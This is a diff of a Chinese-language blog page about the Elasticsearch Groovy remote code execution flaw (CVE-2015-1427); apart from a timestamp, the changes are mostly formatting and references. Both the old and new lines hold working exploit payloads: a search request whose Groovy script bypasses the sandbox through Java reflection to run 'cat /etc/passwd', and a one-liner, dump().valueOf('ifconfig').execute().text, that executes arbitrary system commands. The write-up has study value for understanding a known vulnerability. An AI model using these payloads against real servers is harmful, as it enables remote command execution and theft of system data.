@@ -19,7 +19,7 @@
 <meta property="og:site_name" content="随风'S Blog">
 <meta property="og:description" content="致谢首先感谢Wooyun社区lupin的对漏洞http://zone.wooyun.org/content/18894的分析
 漏洞利用0x1漏洞的成因是Groovy的白名单被绕过了，对常见的危险函数以及某些类做了限制，关于漏洞利用，我们只需要找到一个类能获取当前Class对象，这样的话也就是说可以用Java反射特性执行任意代码了，文中给出了java.lang.Math这个类，然后调用java.la">
-<meta property="og:updated_time" content="2015-06-07T16:03:33.000Z">
+<meta property="og:updated_time" content="2015-06-07T16:07:14.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Elasticsearch Groovy remote code execution">
 <meta name="twitter:description" content="致谢首先感谢Wooyun社区lupin的对漏洞http://zone.wooyun.org/content/18894的分析
@@ -101,13 +101,15 @@
 		
 		<h3 id="致谢">致谢</h3><p>首先感谢Wooyun社区<em>lupin</em>的对漏洞<a href="http://zone.wooyun.org/content/18894" target="_blank" rel="external">http://zone.wooyun.org/content/18894</a>的分析</p>
 <h3 id="漏洞利用0x1">漏洞利用0x1</h3><p>漏洞的成因是Groovy的白名单被绕过了，对常见的危险函数以及某些类做了限制，关于漏洞利用，我们只需要找到一个类能获取当前Class对象，这样的话也就是说可以用Java反射特性执行任意代码了，文中给出了<code>java.lang.Math</code>这个类，然后调用<code>java.lang.Math.class.forName(&#39;xx)</code>就可以执行Java代码了，这里我给出了一个命令执行的Exploit如下</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"size"</span>:<span class="number">1</span>,<span class="string">"script_fields"</span>: &#123;<span class="string">"iswin"</span>: &#123;<span class="string">"script"</span>:<span class="string">"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getInputStream())).readLines()"</span>,<span class="string">"lang"</span>: <span class="string">"groovy"</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;<span class="string">"size"</span>:<span class="number">1</span>,<span class="string">"script_fields"</span>: &#123;<span class="string">"iswin"</span>: &#123;<span class="string">"script"</span>:<span class="string">"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getInputStream())).readLines()"</span>,<span class="string">"lang"</span>: <span class="string">"groovy"</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
 <h3 id="漏洞利用0x2">漏洞利用0x2</h3><p>上面的方法是利用java的反射特性来利用漏洞，这里既然是Groovy语言的远程代码执行，首先需要对Groovy语言有一点简单的认识。</p>
 <blockquote>
 <p>Groovy 是 JVM 的一个替代语言 —替代 是指可以用 Groovy 在 Java 平台上进行 Java 编程，使用方式基本与使用 Java 代码的方式相同。在编写新应用程序时，Groovy 代码能够与 Java 代码很好地结合，也能用于扩展现有代码。<br>Groovy 与 Java 语言的区别很大，Java 语言是一种固定类型语言。在 Groovy 中，类型是可选的，所以您不必输入 String myStr = “Hello”; 来声明 String 变量。<br>除此之外，Groovy 代码还能在运行时轻松地改变自己。这实际上意味着，能够在运行时轻松地为对象指定新方法和属性。</p>
 </blockquote>
 <p>也就是说Groovy有自己的语法规则，通过查询Groovy的相关API，发现就执行命令来说Groovy的String对象中有个<code>&quot;command&quot;.execute()</code>可以执行系统命令，也就是说如果我们能找到一个可以控制的String类型的变量，就可以执行任意命令了，很遗憾，如果直接<code>&quot;ipconfig&quot;.execute()</code>这样就触发了Groovy的的黑名单。<br>如果用反射，可以这样<code>this.class.toString().valueOf(&#39;whoami&#39;).execute().getText()</code>，即可完美实现，但是同过查阅<code>valueOf()</code>这个函数，发现只要是String类型的变量即可调用，通过查阅API发现Groovy的<code>dump()</code>函数返回类型是String，所以完美的远程命令执行Exploit就出来了<code>dump().valueOf(&#39;ifconfig&#39;).execute().text</code>。</p>
-<h3 id="参考链接">参考链接</h3>  
+<h3 id="参考链接">参考链接</h3><pre><code>[<span class="number">1</span>]<span class="symbol">:</span> <span class="symbol">http:</span>/<span class="regexp">/www.ibm.com/developerworks</span><span class="regexp">/cn/education</span><span class="regexp">/java/j</span>-groovy/j-groovy.html <span class="string">"精通 Groovy"</span>
+[<span class="number">2</span>]<span class="symbol">:http</span><span class="symbol">://zone</span>.wooyun.org/content/<span class="number">18894</span> <span class="string">"Elasticsearch Groovy 脚本动态执行漏洞分析和poc（CVE-2015-1427）"</span>
+</code></pre>  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
